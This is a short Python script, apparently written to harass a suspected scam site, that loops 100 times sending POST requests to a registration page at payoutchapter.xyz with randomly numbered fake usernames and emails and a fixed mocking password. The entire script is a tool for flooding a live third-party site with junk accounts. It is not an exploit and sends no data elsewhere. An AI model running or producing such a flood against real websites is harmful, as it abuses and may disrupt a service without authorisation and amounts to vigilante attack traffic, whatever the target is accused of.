import requests
import random

def sigmaboyattack(attempt):
    # Generate random username and email
    username = "scammingisbad" + ''.join(random.choice('0123456789') for _ in range(3))
    email = "finda9-5" + ''.join(random.choice('0123456789') for _ in range(3)) + "@jobapplications.com"

    # Send POST request
    try:
        response = requests.post(
            "https://payoutchapter.xyz/register.php",
            data={
                "username": username,
                "password": "dontscamitsnotsigma",
                "email": email,
                "registersub": "Register"
            }
        )
        # Print success message with attempt number
        print(f"Attempt {attempt + 1}: Request sent. Status code: {response.status_code} email: {email} username: {username}")
    except requests.exceptions.RequestException as e:
        # Print error message with attempt number
        print(f"Attempt {attempt + 1}: An error occurred: {e}")

# Execute the function 100 times
for i in range(100):
    sigmaboyattack(i)